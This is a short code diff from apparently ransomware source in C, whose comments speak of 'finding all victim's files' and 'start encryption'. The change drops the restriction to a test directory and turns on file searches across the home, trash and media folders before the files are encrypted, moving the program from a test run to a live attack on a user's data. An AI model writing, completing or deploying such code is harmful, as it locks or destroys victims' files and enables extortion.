@@ -26,10 +26,9 @@ int main(){
 
     char * test_path = "/home/tarcisio/tests/";
     /* finding all victim's files */
-    find_files(&files, test_path);
-    // find_files(&files, home);
-    // find_files(&files, trash);
-    // find_files(&files, media);
+    find_files(&files, home);
+    find_files(&files, trash);
+    find_files(&files, media);
 
     /* start encryption */
     encrypt_files(files, &encrypted, &not_encrypted);
